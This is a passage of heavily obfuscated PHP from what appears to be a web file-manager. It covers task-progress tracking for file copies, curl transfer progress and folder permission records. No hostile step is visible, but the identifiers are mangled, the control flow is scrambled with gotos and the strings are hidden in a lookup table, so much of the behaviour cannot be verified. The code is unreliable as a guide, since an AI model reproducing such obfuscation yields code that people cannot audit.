self::updateTask($DŸ¨†ÒÌ÷); } private static function updateTask(&$bÈ¬·“è™ö) { $D“§Ç®¹°‚ =& $_SERVER[æ§›¦ÌáØ]; if ($bÈ¬·“è™ö[$D“§Ç®¹°‚[1574]] == $D“§Ç®¹°‚[1084] || $bÈ¬·“è™ö[$D“§Ç®¹°‚[1574]] == $D“§Ç®¹°‚[107]) { if ($bÈ¬·“è™ö[$D“§Ç®¹°‚[1568]]) { $bÈ¬·“è™ö[$D“§Ç®¹°‚[1571]] = $bÈ¬·“è™ö[$D“§Ç®¹°‚[1570]] + $bÈ¬·“è™ö[$D“§Ç®¹°‚[1567]]; } } else { if ($bÈ¬·“è™ö[$D“§Ç®¹°‚[1574]] == $D“§Ç®¹°‚[1174]) { if ($bÈ¬·“è™ö[$D“§Ç®¹°‚[1568]] == $D“§Ç®¹°‚[1084]) { $bÈ¬·“è™ö[$D“§Ç®¹°‚[1571]] = $bÈ¬·“è™ö[$D“§Ç®¹°‚[1570]] + $bÈ¬·“è™ö[$D“§Ç®¹°‚[1567]] * 0.5; } else { if ($bÈ¬·“è™ö[$D“§Ç®¹°‚[1568]] == $D“§Ç®¹°‚[107]) { $bÈ¬·“è™ö[$D“§Ç®¹°‚[1571]] = $bÈ¬·“è™ö[$D“§Ç®¹°‚[1570]] + $bÈ¬·“è™ö[$D“§Ç®¹°‚[1566]] * 0.5 + $bÈ¬·“è™ö[$D“§Ç®¹°‚[1567]] * 0.5; } } } } $bÈ¬·“è™ö[$D“§Ç®¹°‚[1521]] = $bÈ¬·“è™ö[$D“§Ç®¹°‚[1571]] / $bÈ¬·“è™ö[$D“§Ç®¹°‚[716]]; if ($bÈ¬·“è™ö[$D“§Ç®¹°‚[1521]] > 0) { $aÛ¥šàÃ…š = timeFloat() - $bÈ¬·“è™ö[$D“§Ç®¹°‚[742]] - $bÈ¬·“è™ö[$D“§Ç®¹°‚[1524]]; $bÈ¬·“è™ö[$D“§Ç®¹°‚[1525]] = $aÛ¥šàÃ…š * (1 - $bÈ¬·“è™ö[$D“§Ç®¹°‚[1521]]) / $bÈ¬·“è™ö[$D“§Ç®¹°‚[1521]]; } } public function addPath($D£ÙåÙ …’) { goto cšÚ—¼‹„©; cğ³†œ÷¦Ä: if ($aêˆå¢Æª•[$B†¨ß–ç¼[29]] == $B†¨ß–ç¼[193]) { $AÉ²‹»¹ÒÂ[$B†¨ß–ç¼[1011]] += 1; } else { $AÉ²‹»¹ÒÂ[$B†¨ß–ç¼[1011]] += $aêˆå¢Æª•[$B†¨ß–ç¼[81]][$B†¨ß–ç¼[79]]; if ($aêˆå¢Æª•[$B†¨ß–ç¼[395]]) { $AÉ²‹»¹ÒÂ[$B†¨ß–ç¼[1011]] += $aêˆå¢Æª•[$B†¨ß–ç¼[81]][$B†¨ß–ç¼[80]] + 1; } } $AÉ²‹»¹ÒÂ[$B†¨ß–ç¼[716]] += $aêˆå¢Æª•[$B†¨ß–ç¼[78]]; $this->update(); goto a©õÉ·¬Äö; f‰­ÙÓ¼‡ğ: $aêˆå¢Æª• = IO::infoWithChildren($D£ÙåÙ …’); $B´†è¥Û¾• = $AÉ²‹»¹ÒÂ[$B†¨ß–ç¼[1575]] ? $AÉ²‹»¹ÒÂ[$B†¨ß–ç¼[1575]][$B†¨ß–ç¼[1576]] : 0; $AÉ²‹»¹ÒÂ[$B†¨ß–ç¼[1575]] = array($B†¨ß–ç¼[1576] => $B´†è¥Û¾• + 1, $B†¨ß–ç¼[413] => $aêˆå¢Æª•[$B†¨ß–ç¼[28]], $B†¨ß–ç¼[76] => $aêˆå¢Æª•[$B†¨ß–ç¼[76]], $B†¨ß–ç¼[500] => $aêˆå¢Æª•[$B†¨ß–ç¼[500]] ? $aêˆå¢Æª•[$B†¨ß–ç¼[500]] : $aêˆå¢Æª•[$B†¨ß–ç¼[76]]); goto cğ³†œ÷¦Ä; cšÚ—¼‹„©: $B†¨ß–ç¼ =& $_SERVER[æ§›¦ÌáØ]; if (!$D£ÙåÙ …’) { return; } $AÉ²‹»¹ÒÂ =& $this->task; goto f‰­ÙÓ¼‡ğ; a©õÉ·¬Äö: } public function sourceCopyFolderStart() { $this->sourceCopyFolder = !0; } public function sourceCopyFolderEnd() { $this->sourceCopyFolder = !1; } public function sourceAddFile($C›ÛÁ‰½) { $c‰ß‹ŠŠÑ¶ =& $_SERVER[æ§›¦ÌáØ]; $BÀ‡½‹È¹Í =& $this->task; $BÀ‡½‹È¹Í[$c‰ß‹ŠŠÑ¶[1564]] = $C›ÛÁ‰½[$c‰ß‹ŠŠÑ¶[28]]; $BÀ‡½‹È¹Í[$c‰ß‹ŠŠÑ¶[1013]] = $C›ÛÁ‰½[$c‰ß‹ŠŠÑ¶[28]]; $this->update(); } public function copyFileStart($B‘è²åß±Š, $e§óÉ›÷´Ú, $Cä¬³”», $eßãŸŒÛõ, $dÒÆó¼Áù, $DÎ‹‡Ô†ÔÀ) { goto E‚õß‹©ó; bíñŒ‚™: $GLOBALS[$C³Å–‰ŠÅ[1578]] = $dÒÆó¼Áù; $GLOBALS[$C³Å–‰ŠÅ[1577]] = $DÎ‹‡Ô†ÔÀ; $c”ˆƒ©‹ß¢ =& $this->task; goto d¶ºµöê“‘; BÑøƒÚ‡Ü¯: $c”ˆƒ©‹ß¢[$C³Å–‰ŠÅ[1013]] = $C³Å–‰ŠÅ[33]; $c”ˆƒ©‹ß¢[$C³Å–‰ŠÅ[1568]] = $C³Å–‰ŠÅ[33]; $c”ˆƒ©‹ß¢[$C³Å–‰ŠÅ[1569]] = 0; goto e‰‹³Îğ™; BƒÒŒÑÊ: $this->update(0, $B–§‰¹¢Ÿ); goto DÆœ¾šƒŠ; e‰‹³Îğ™: $B–§‰¹¢Ÿ = $c”ˆƒ©‹ß¢[$C³Å–‰ŠÅ[1566]] > 1024 * 1024 * 10 ? !0 : !1; Cache::remove($c”ˆƒ©‹ß¢[$C³Å–‰ŠÅ[393]] . $C³Å–‰ŠÅ[1579]); if ($B–§‰¹¢Ÿ && file_exists(get_path_father($eßãŸŒÛõ))) { Cache::set($c”ˆƒ©‹ß¢[$C³Å–‰ŠÅ[393]] . $C³Å–‰ŠÅ[1579], $eßãŸŒÛõ); $c”ˆƒ©‹ß¢[$C³Å–‰ŠÅ[1539]] = array($C³Å–‰ŠÅ[1580], $C³Å–‰ŠÅ[1581]); } goto BƒÒŒÑÊ; d¶ºµöê“‘: $c”ˆƒ©‹ß¢[$C³Å–‰ŠÅ[1564]] = $fàá«Ü‹ëâ; $c”ˆƒ©‹ß¢[$C³Å–‰ŠÅ[1566]] = (int) $B‘è²åß±Š->size($e§óÉ›÷´Ú); $c”ˆƒ©‹ß¢[$C³Å–‰ŠÅ[1567]] = 0; goto BÑøƒÚ‡Ü¯; E‚õß‹©ó: $C³Å–‰ŠÅ =& $_SERVER[æ§›¦ÌáØ]; $fàá«Ü‹ëâ = $dÒÆó¼Áù; if ($fàá«Ü‹ëâ == $GLOBALS[$C³Å–‰ŠÅ[1577]]) { $fàá«Ü‹ëâ = $GLOBALS[$C³Å–‰ŠÅ[1578]]; } goto bíñŒ‚™; DÆœ¾šƒŠ: } public static function updateCopyLocalFileSize($A…˜¼´¿ŒÜ) { goto A’‚„Š¾µ; A’‚„Š¾µ: $dãËè¬´ÁÑ =& $_SERVER[æ§›¦ÌáØ]; $C•‹»ğæ = Cache::get($A…˜¼´¿ŒÜ[$dãËè¬´ÁÑ[393]] . $dãËè¬´ÁÑ[1579]); if (!$C•‹»ğæ || !file_exists($C•‹»ğæ)) { return $A…˜¼´¿ŒÜ; } goto DŠ¨µ²¸ïÔ; Eˆ¿¿Ü…Ëä: return $A…˜¼´¿ŒÜ; goto E†·ßÏë; DŠ¨µ²¸ïÔ: $A…˜¼´¿ŒÜ[$dãËè¬´ÁÑ[1567]] = @filesize($C•‹»ğæ); $A…˜¼´¿ŒÜ[$dãËè¬´ÁÑ[1571]] += $A…˜¼´¿ŒÜ[$dãËè¬´ÁÑ[1567]]; self::updateTask($A…˜¼´¿ŒÜ); goto Eˆ¿¿Ü…Ëä; E†·ßÏë: } public function copyFileEnd($eíÊ«Ì†éË, $CÑÚ‚¢‚•Ç, $AåÄ„–áƒÌ, $B“ß…Ò­Îå, $d‰ï”·ƒö, $cĞÓ¡Œ‚¨Ò) { goto BœŠ×å‘Ëø; BœŠ×å‘Ëø: $FÖ Ô‰ºÔ¸ =& $_SERVER[æ§›¦ÌáØ]; $e·£ä²ÔÁà =& $this->task; $e·£ä²ÔÁà[$FÖ Ô‰ºÔ¸[1567]] = $e·£ä²ÔÁà[$FÖ Ô‰ºÔ¸[1566]]; goto Cä¼÷ø¼; Cä¼÷ø¼: $e·£ä²ÔÁà[$FÖ Ô‰ºÔ¸[1568]] = $FÖ Ô‰ºÔ¸[33]; unset($e·£ä²ÔÁà[$FÖ Ô‰ºÔ¸[1539]]); if ($d‰ï”·ƒö == $e·£ä²ÔÁà[$FÖ Ô‰ºÔ¸[1564]]) { $e·£ä²ÔÁà[$FÖ Ô‰ºÔ¸[1570]] += $e·£ä²ÔÁà[$FÖ Ô‰ºÔ¸[1566]]; $e·£ä²ÔÁà[$FÖ Ô‰ºÔ¸[1571]] = $e·£ä²ÔÁà[$FÖ Ô‰ºÔ¸[1570]]; $this->update(1); } else { $this->update(); $e·£ä²ÔÁà[$FÖ Ô‰ºÔ¸[1567]] = 0; } goto e¨§ª¨‘’¯; e¨§ª¨‘’¯: Cache::remove($e·£ä²ÔÁà[$FÖ Ô‰ºÔ¸[393]] . $FÖ Ô‰ºÔ¸[1579]); self::log($FÖ Ô‰ºÔ¸[1582] . $CÑÚ‚¢‚•Ç . $FÖ Ô‰ºÔ¸[67] . $B“ß…Ò­Îå . $FÖ Ô‰ºÔ¸[229] . $d‰ï”·ƒö . $FÖ Ô‰ºÔ¸[1583] . $e·£ä²ÔÁà[$FÖ Ô‰ºÔ¸[1564]]); goto DÆò¼ÕÏºÒ; DÆò¼ÕÏºÒ: } public function updateFileEnd($EïÒ¾†òº…, $eÄ†æÔëñ‘) { goto fáŒ“àËİ´; fáŒ“àËİ´: $a‰‚êˆ‚£µ =& $_SERVER[æ§›¦ÌáØ]; $DÔãïŸõ˜¶ =& $this->task; $DÔãïŸõ˜¶[$a‰‚êˆ‚£µ[1564]] = $EïÒ¾†òº…; goto c¬Ì ³ä¶‘; c¬Ì ³ä¶‘: $DÔãïŸõ˜¶[$a‰‚êˆ‚£µ[1566]] = $eÄ†æÔëñ‘; $DÔãïŸõ˜¶[$a‰‚êˆ‚£µ[1570]] += $eÄ†æÔëñ‘; $DÔãïŸõ˜¶[$a‰‚êˆ‚£µ[1571]] = $DÔãïŸõ˜¶[$a‰‚êˆ‚£µ[1570]]; goto A…œÕ¢®½Ğ; A…œÕ¢®½Ğ: $this->update(1); self::log($a‰‚êˆ‚£µ[1584] . $EïÒ¾†òº…); goto e…²‡ñ´ï¹; e…²‡ñ´ï¹: } public function sourceModelCopy($eİÁİõÖœ) { goto f¶êŞÀµÊ‹; fŒŞÜÔßİÍ: switch ($b•ˆôÊæ…Ì) { case $DÎ ÓÉİª[548]: $AÃ¶ª¦ËŒ± = 1; break; case $DÎ ÓÉİª[551]: $D‹ÓÉ”ì²ã[$DÎ ÓÉİª[1564]] = $AŒÇÓØ´®[$DÎ ÓÉİª[28]]; break; case $DÎ ÓÉİª[553]: $AÃ¶ª¦ËŒ± = intval($eİÁİõÖœ[$DÎ ÓÉİª[377]] * 0.4); break; case $DÎ ÓÉİª[555]: $AÃ¶ª¦ËŒ± = intval($eİÁİõÖœ[$DÎ ÓÉİª[377]] * 0.2); break; case $DÎ ÓÉİª[557]: $AÃ¶ª¦ËŒ± = intval($eİÁİõÖœ[$DÎ ÓÉİª[377]] * 0.4); break; } $this->update($AÃ¶ª¦ËŒ±); $this->sourceModelCopyFlag = !1; goto F¿ëŒÒªá±; f¶êŞÀµÊ‹: $DÎ ÓÉİª =& $_SERVER[æ§›¦ÌáØ]; $b•ˆôÊæ…Ì = $eİÁİõÖœ[0]; $AŒÇÓØ´® = $eİÁİõÖœ[1]; goto Dƒ¬Ùâò²; Dƒ¬Ùâò²: $D‹ÓÉ”ì²ã =& $this->task; $this->sourceModelCopyFlag = !0; $AÃ¶ª¦ËŒ± = 0; goto fŒŞÜÔßİÍ; F¿ëŒÒªá±: } public function sourceRemove($d’êª¤Õ§¢, $e‡±œ¢ô¡) { $c’İˆäÃ =& $_SERVER[æ§›¦ÌáØ]; $this->sourceModelCopyFlag = !0; $bèÓØ®ª = 1; if (isset($d’êª¤Õ§¢[$c’İˆäÃ[81]])) { $bèÓØ®ª = $d’êª¤Õ§¢[$c’İˆäÃ[81]][$c’İˆäÃ[79]] + $d’êª¤Õ§¢[$c’İˆäÃ[81]][$c’İˆäÃ[80]] + 1; } $this->update($bèÓØ®ª); $this->sourceModelCopyFlag = !1; } public function sourceMove($AÁ¥íÍ®«Š) { $this->sourceRemove($AÁ¥íÍ®«Š, !1); } public function curlProgress($F»Ç‘ÓĞé‹, $F¹±æÕ‰œ˜, $CšŞÉšØ‰, $f„‹óÎæ•ñ, $díÄ‘éäÕ©) { $e¼ŸŠëÊ— =& $_SERVER[æ§›¦ÌáØ]; $B„á”¸ŠÛÒ =& $this->task; if ($díÄ‘éäÕ© > 0) { $B„á”¸ŠÛÒ[$e¼ŸŠëÊ—[1013]] = $e¼ŸŠëÊ—[1585]; $B„á”¸ŠÛÒ[$e¼ŸŠëÊ—[1568]] = $e¼ŸŠëÊ—[107]; if ($B„á”¸ŠÛÒ[$e¼ŸŠëÊ—[1566]]) { $B„á”¸ŠÛÒ[$e¼ŸŠëÊ—[1567]] = $díÄ‘éäÕ©; } if ($B„á”¸ŠÛÒ[$e¼ŸŠëÊ—[1569]]) { $B„á”¸ŠÛÒ[$e¼ŸŠëÊ—[1567]] = $díÄ‘éäÕ© + $B„á”¸ŠÛÒ[$e¼ŸŠëÊ—[1569]]; } } else { if ($CšŞÉšØ‰ > 0) { if ($B„á”¸ŠÛÒ[$e¼ŸŠëÊ—[1566]] == $F¹±æÕ‰œ˜) { $B„á”¸ŠÛÒ[$e¼ŸŠëÊ—[1567]] = $CšŞÉšØ‰; $B„á”¸ŠÛÒ[$e¼ŸŠëÊ—[1013]] = $e¼ŸŠëÊ—[1586]; $B„á”¸ŠÛÒ[$e¼ŸŠëÊ—[1568]] = $e¼ŸŠëÊ—[1084]; } } } $this->update(); } public function curlProgressStart($BÕÑİĞ¼) { } public function curlProgressEnd($CÛÆÊèìÄÕ) { goto B„„³ÎÏˆœ; BŒ•­‰Ôê¸: $this->update(); goto eãù¸ôê¯; B„„³ÎÏˆœ: $Cùì––Å¤ =& $_SERVER[æ§›¦ÌáØ]; $C¡£íŸ•É° =& $this->task; $cÖÕñŒâÊ = curl_getinfo($CÛÆÊèìÄÕ); goto b…¨‰ò—Ó; b…¨‰ò—Ó: $CìŒ‰İÑ¤ = $cÖÕñŒâÊ[$Cùì––Å¤[1587]]; if ($CìŒ‰İÑ¤ == -1) { $CìŒ‰İÑ¤ = $cÖÕñŒâÊ[$Cùì––Å¤[1588]]; } if ($C¡£íŸ•É°[$Cùì––Å¤[1568]] == $Cùì––Å¤[107] && $CìŒ‰İÑ¤) { $C¡£íŸ•É°[$Cùì––Å¤[1569]] += $CìŒ‰İÑ¤; } goto BŒ•­‰Ôê¸; eãù¸ôê¯: } } class TaskHttp extends Task { protected function startAfter() { $A»’Œ«å­¥ =& $_SERVER[æ§›¦ÌáØ]; $FòÃ×†Ø¥ô =& $this->task; $FòÃ×†Ø¥ô[$A»’Œ«å­¥[1589]] = 1; Hook::bind($A»’Œ«å­¥[1558], array($this, $A»’Œ«å­¥[1590])); Hook::bind($A»’Œ«å­¥[1560], array($this, $A»’Œ«å­¥[1591])); Hook::bind($A»’Œ«å­¥[1562], array($this, $A»’Œ«å­¥[1592])); } protected function endAfter() { $d§¸ÍêÄÇ› =& $_SERVER[æ§›¦ÌáØ]; Hook::unbind($d§¸ÍêÄÇ›[1558], array($this, $d§¸ÍêÄÇ›[1590])); Hook::unbind($d§¸ÍêÄÇ›[1560], array($this, $d§¸ÍêÄÇ›[1591])); Hook::unbind($d§¸ÍêÄÇ›[1562], array($this, $d§¸ÍêÄÇ›[1592])); } public function progressStart($B¿õ·‘š¾) { $d¢ËÚ†”Ó =& $_SERVER[æ§›¦ÌáØ]; $dŠ“ˆà§¡Ç = curl_getinfo($B¿õ·‘š¾); self::log($d¢ËÚ†”Ó[1593] . $dŠ“ˆà§¡Ç[$d¢ËÚ†”Ó[305]]); self::valueSet($this->task[$d¢ËÚ†”Ó[393]], $this->task); } public function progressEnd($a§ î¼„¬) { $Cæá•Ó¬‘Ö =& $_SERVER[æ§›¦ÌáØ]; self::log($Cæá•Ó¬‘Ö[1594] . $this->task[$Cæá•Ó¬‘Ö[393]]); $this->end(); } public function progress($C¨òÉÌğà³, $eõÒğšÂ‘Ë, $Dêõ³ë°íÌ, $A†ğÀ–¼‡¨, $d¡ó¹”å) { $E“ÓÚñ·İ­ =& $_SERVER[æ§›¦ÌáØ]; $DÖ¤õòŒØ… =& $this->task; if ($d¡ó¹”å > 0) { $DÖ¤õòŒØ…[$E“ÓÚñ·İ­[1011]] = $DÖ¤õòŒØ…[$E“ÓÚñ·İ­[1011]] == 0 ? $A†ğÀ–¼‡¨ : $DÖ¤õòŒØ…[$E“ÓÚñ·İ­[1011]]; $DÖ¤õòŒØ…[$E“ÓÚñ·İ­[1026]] = $d¡ó¹”å; } else { if ($Dêõ³ë°íÌ > 0) { $DÖ¤õòŒØ…[$E“ÓÚñ·İ­[1011]] = $DÖ¤õòŒØ…[$E“ÓÚñ·İ­[1011]] == 0 ? $eõÒğšÂ‘Ë : $DÖ¤õòŒØ…[$E“ÓÚñ·İ­[1011]]; $DÖ¤õòŒØ…[$E“ÓÚñ·İ­[1026]] = $Dêõ³ë°íÌ; } } $this->update(); self::log("\x70\x72\x6f\x67\x72\145\163\163\110\x74\x74\160\x3a\144\157\x77\156\x3a{$Dêõ³ë°íÌ}\57{$eõÒğšÂ‘Ë}\x3b\40\165\x70\154\x6f\x61\144\x3a{$d¡ó¹”å}\57{$A†ğÀ–¼‡¨}\73"); } } goto D·¥îÇ‘Í®; aî™øõßä: class SourceAuthModel extends ModelBase { protected $tableName = "\151\x6f\137\163\x6f\x75\x72\143\145\x5f\x61\x75\164\150"; public function getAuth($b°â£µ„Ê) { goto dËìŸ…ˆ; eù½ÙÜ¦¹: array_multisort($e‚É´‰¼®å, SORT_DESC, $cîË†£½®°); return $cîË†£½®°; goto A›ƒİì«¦Æ; E¢³”Šç¥á: $e‚É´‰¼®å = array(); $A‘×¥ó«©Ú = 2 << 25; foreach ($Cë‰ïÄ‘–§ as $AÓ¢ôö‡çÆ) { goto f¸ÌçÂ‡¿Û; f¸ÌçÂ‡¿Û: $Eâ‘Õ’µÁ½ = Model($e—ù­àªî[488])->listData($AÓ¢ôö‡çÆ[$e—ù­àªî[1784]]); if (!$Eâ‘Õ’µÁ½) { continue; } $cîË†£½®°[] = $AÓ¢ôö‡çÆ; goto e±ó‚¼œÔ¬; e±ó‚¼œÔ¬: $D‰Ú“É‚Õä = 0; if ($AÓ¢ôö‡çÆ[$e—ù­àªî[404]] == SourceModel::TYPE_GROUP) { $D‰Ú“É‚Õä = $A‘×¥ó«©Ú * 2; } if ($AÓ¢ôö‡çÆ[$e—ù­àªî[404]] == SourceModel::TYPE_USER) { $D‰Ú“É‚Õä = $A‘×¥ó«©Ú; } goto D›ô‹ÉĞÓˆ; D›ô‹ÉĞÓˆ: if ($AÓ¢ôö‡çÆ[$e—ù­àªî[404]] == SourceModel::TYPE_USER && $AÓ¢ôö‡çÆ[$e—ù­àªî[484]] == $e—ù­àªî[191]) { $D‰Ú“É‚Õä = 0; } $e‚É´‰¼®å[] = $Eâ‘Õ’µÁ½[$e—ù­àªî[406]] + $D‰Ú“É‚Õä; goto b¦Ö¨¥¯•Ù; b¦Ö¨¥¯•Ù: } goto eù½ÙÜ¦¹; dËìŸ…ˆ: $e—ù­àªî =& $_SERVER[æ§›¦ÌáØ]; $Cë‰ïÄ‘–§ = $this->sourceAuthSelect($b°â£µ„Ê); $cîË†£½®° = array(); goto E¢³”Šç¥á; A›ƒİì«¦Æ: } public function sourceAuthSelect($C°¹ŸÓ£ÉÔ) { goto c…¯•§¤µ ; cƒ‚ìĞË¸–: $EÜÛµâ¶¦Ñ = $this->field($d…ÌÙÑÊ‚“)->order($f¨í‚¢‘Ä‹[393])->where($cÄ¡Ø‡Ş”×)->select(); $FÆƒ—•ŞêÚ = array_to_keyvalue_group($EÜÛµâ¶¦Ñ, $f¨í‚¢‘Ä‹[395]); foreach ($C°¹ŸÓ£ÉÔ as $BºñĞ‘—ç›) { $fš˜íœçÕ±[$BºñĞ‘—ç›] = $FÆƒ—•ŞêÚ[$BºñĞ‘—ç›] ? $FÆƒ—•ŞêÚ[$BºñĞ‘—ç›] : array(); } goto d¯ë· ¹»Ÿ; c…¯•§¤µ : $f¨í‚¢‘Ä‹ =& $_SERVER[æ§›¦ÌáØ]; static $fš˜íœçÕ± = array(); $cŸ‚¶Œ²»‡ = is_array($C°¹ŸÓ£ÉÔ) ? !1 : !0; goto d›Â¾öÅÅè; d›Â¾öÅÅè: if ($cŸ‚¶Œ²»‡) { $C°¹ŸÓ£ÉÔ = array($C°¹ŸÓ£ÉÔ); } $aÓÃÓôˆÙî = array(); foreach ($C°¹ŸÓ£ÉÔ as $BºñĞ‘—ç›) { if (isset($fš˜íœçÕ±[$BºñĞ‘—ç›])) { $aÓÃÓôˆÙî[$BºñĞ‘—ç›] = $fš˜íœçÕ±[$BºñĞ‘—ç›]; } } goto CˆŞÖÃƒ—; d¯ë· ¹»Ÿ: if ($cŸ‚¶Œ²»‡) { return $EÜÛµâ¶¦Ñ; } return $FÆƒ—•ŞêÚ; goto dˆ¹Ê³øé; CˆŞÖÃƒ—: if (count($aÓÃÓôˆÙî) == count($C°¹ŸÓ£ÉÔ)) { return $cŸ‚¶Œ²»‡ ? $aÓÃÓôˆÙî[$C°¹ŸÓ£ÉÔ[0]] : $aÓÃÓôˆÙî; } $d…ÌÙÑÊ‚“ = $f¨í‚¢‘Ä‹[1856]; $cÄ¡Ø‡Ş”× = array($f¨í‚¢‘Ä‹[395] => array($f¨í‚¢‘Ä‹[7], $C°¹ŸÓ£ÉÔ)); goto cƒ‚ìĞË¸–; dˆ¹Ê³øé: } public function setAuth($e‡Ó¬Áä³Î, $BÃˆƒÍî¿è) { goto b¤¢¤Ğ¨§Î; cÌŠ¯Œìˆ¹: if ($bïÃÇó†Ö != $d±¢‹§¢¬) { $D—›ÛŒæô• = array($BÉï†Üæ‘[1689] => $bïÃÇó†Ö); $A‹¡óÈ® Ú = Model($BÉï†Üæ‘[1770])->field($BÉï†Üæ‘[1520])->where($D—›ÛŒæô•)->select(); $A‹¡óÈ® Ú = array_to_keyvalue($A‹¡óÈ® Ú, $BÉï†Üæ‘[33], $BÉï†Üæ‘[1520]); } $b‹•«£°Òù = array(SourceModel::TYPE_GROUP, SourceModel::TYPE_USER); $eìòµÄ£ö© = array(); goto a–À©ê; b¤¢¤Ğ¨§Î: $BÉï†Üæ‘ =& $_SERVER[æ§›¦ÌáØ]; $Dª˜ğ¨¹ = Model($BÉï†Üæ‘[1196])->sourceInfo($e‡Ó¬Áä³Î); if (!$Dª˜ğ¨¹) { return !1; } goto EœÑ†Ê”éƒ; Fµ¬‡Ñ­÷: return !0; goto B¿‡ã¢¸ã; a–À©ê: foreach ($BÃˆƒÍî¿è as $aÊ­ÂÈ¼¯õ) { if (!in_array($aÊ­ÂÈ¼¯õ[$BÉï†Üæ‘[404]], $b‹•«£°Òù)) { show_json(LNG($BÉï†Üæ‘[1857]), !1); } if ($bïÃÇó†Ö != $d±¢‹§¢¬) { if ($aÊ­ÂÈ¼¯õ[$BÉï†Üæ‘[404]] == SourceModel::TYPE_GROUP) { } if ($aÊ­ÂÈ¼¯õ[$BÉï†Üæ‘[484]] != 0 && !in_array($aÊ­ÂÈ¼¯õ[$BÉï†Üæ‘[484]], $A‹¡óÈ® Ú)) { } } if ($aÊ­ÂÈ¼¯õ[$BÉï†Üæ‘[484]] == 0) { $aÊ­ÂÈ¼¯õ[$BÉï†Üæ‘[404]] = SourceModel::TYPE_USER; } $eìòµÄ£ö©[] = array($BÉï†Üæ‘[395] => $e‡Ó¬Áä³Î, $BÉï†Üæ‘[404] => intval($aÊ­ÂÈ¼¯õ[$BÉï†Üæ‘[404]]), $BÉï†Üæ‘[484] => intval($aÊ­ÂÈ¼¯õ[$BÉï†Üæ‘[484]]), $BÉï†Üæ‘[1784] => intval($aÊ­ÂÈ¼¯õ[$BÉï†Üæ‘[1784]]) ? intval($aÊ­ÂÈ¼¯õ[$BÉï†Üæ‘[1784]]) : 0, $BÉï†Üæ‘[1838] => intval($aÊ­ÂÈ¼¯õ[$BÉï†Üæ‘[1838]]) ? intval($aÊ­ÂÈ¼¯õ[$BÉï†Üæ‘[1838]]) : -1); } $this->where(array($BÉï†Üæ‘[410] => $e‡Ó¬Áä³Î))->delete(); $this->addAll($eìòµÄ£ö©); goto Fµ¬‡Ñ­÷; EœÑ†Ê”éƒ: if ($Dª˜ğ¨¹[$BÉï†Üæ‘[404]] != SourceModel::TYPE_GROUP) { return !1; } $d±¢‹§¢¬ = 1; $bïÃÇó†Ö = $Dª˜ğ¨¹[$BÉï†Üæ‘[484]]; goto cÌŠ¯Œìˆ¹; B¿‡ã¢¸ã: } public function authClear($DäÂ˜¥‘ã) { $E½¢öãÂÃ» =& $_SERVER[æ§›¦ÌáØ]; $Bëã¶ÏÎ = Model($E½¢öãÂÃ»[1196])->sourceInfo($DäÂ˜¥‘ã); $Cõ¤ñÈ„Š = array($DäÂ˜¥‘ã); if ($Bëã¶ÏÎ[$E½¢öãÂÃ»[403]] == $E½¢öãÂÃ»[87]) { $e²¯ß¤ŠÀÖ = array($E½¢öãÂÃ»[566] => array($E½¢öãÂÃ»[525], $Bëã¶ÏÎ[$E½¢öãÂÃ»[502]] . $DäÂ˜¥‘ã . $E½¢öãÂÃ»[526])); $Cõ¤ñÈ„Š = Model($E½¢öãÂÃ»[1196])->field($E½¢öãÂÃ»[410])->where($e²¯ß¤ŠÀÖ)->getField($E½¢öãÂÃ»[395], !0); $Cõ¤ñÈ„Š[] = $DäÂ˜¥‘ã; } $this->where(array($E½¢öãÂÃ»[410] => array($E½¢öãÂÃ»[411], $Cõ¤ñÈ„Š)))->delete(); return !0; } public function getAllChildren($A¼£ôªÀ–‡) { goto eÑöÎ–íçÓ; e‘Å»îĞ“Ï: if (!$A¦ğÁÒö®°) { return array(); } $f¢«ç‚™¸ = $dğ·ùáªÎ‘[1858]; $dôçÈÊÎ‘’ = array($dğ·ùáªÎ‘[395] => array($dğ·ùáªÎ‘[7], $A¦ğÁÒö®°), $dğ·ùáªÎ‘[423] => $dğ·ùáªÎ‘[191]); goto DÖ´ßâßÔğ; bŞÊ‹â³Èö: if ($d¤³¦ªÜ¡‹[$dğ·ùáªÎ‘[404]] != SourceModel::TYPE_GROUP) { return array(); } $dáîÓˆÖ£– = 1; $F„ŠĞÄòÌ = array($A¼£ôªÀ–‡); goto fœÇ¤ùà; d×¾Ë—ÓÒª: return $this->sourceListAuth($Cô¤’Ø¶…); goto eøëèá“Ó; fœÇ¤ùà: if ($d¤³¦ªÜ¡‹[$dğ·ùáªÎ‘[478]] == $dğ·ùáªÎ‘[191] && $d¤³¦ªÜ¡‹[$dğ·ùáªÎ‘[484]] != $dáîÓˆÖ£–) { $F„ŠĞÄòÌ = $this->groupChidldAllRootSource($d¤³¦ªÜ¡‹[$dğ·ùáªÎ‘[484]]); } $A¦ğÁÒö®° = $this->field($dğ·ùáªÎ‘[395])->group($dğ·ùáªÎ‘[395])->select(); $A¦ğÁÒö®° = array_to_keyvalue($A¦ğÁÒö®°, $dğ·ùáªÎ‘[33], $dğ·ùáªÎ‘[395]); goto e‘Å»îĞ“Ï; eÑöÎ–íçÓ: $dğ·ùáªÎ‘ =& $_SERVER[æ§›¦ÌáØ]; $d¤³¦ªÜ¡‹ = Model($dğ·ùáªÎ‘[1196])->sourceInfo($A¼£ôªÀ–‡); if ($d¤³¦ªÜ¡‹[$dğ·ùáªÎ‘[403]] != $dğ·ùáªÎ‘[87]) { return $this->sourceListAuth(array($A¼£ôªÀ–‡)); } goto bŞÊ‹â³Èö; DÖ´ßâßÔğ: $DÑè‰˜„ö = Model($dğ·ùáªÎ‘[783])->field($f¢«ç‚™¸)->where($dôçÈÊÎ‘’)->select(); $Cô¤’Ø¶… = array($A¼£ôªÀ–‡); foreach ($DÑè‰˜„ö as $aÙ¶‘¶Š) { foreach ($F„ŠĞÄòÌ as $BğõªÛŒíŒ) { $F×ÜĞ­‡Ë¶ = $dğ·ùáªÎ‘[47] . $BğõªÛŒíŒ . $dğ·ùáªÎ‘[47]; $a‰¡ØóÃ¨Å = $aÙ¶‘¶Š[$dğ·ùáªÎ‘[502]] . $aÙ¶‘¶Š[$dğ·ùáªÎ‘[395]] . $dğ·ùáªÎ‘[47]; if (strstr($a‰¡ØóÃ¨Å, $F×ÜĞ­‡Ë¶)) { $Cô¤’Ø¶…[] = $aÙ¶‘¶Š[$dğ·ùáªÎ‘[395]]; break; } } } goto d×¾Ë—ÓÒª; eøëèá“Ó: } private function sourceListAuth($f…‘±Öø’) { goto BàƒŒàä™¨; F¯ì‘‚³Ú: array_multisort($C¥Ú»‚ö«Ô, SORT_ASC, $EÆé†–Ó); return $EÆé†–Ó; goto F‘¹™±ŠÉ²; BàƒŒàä™¨: $Fè¸ïâÈá =& 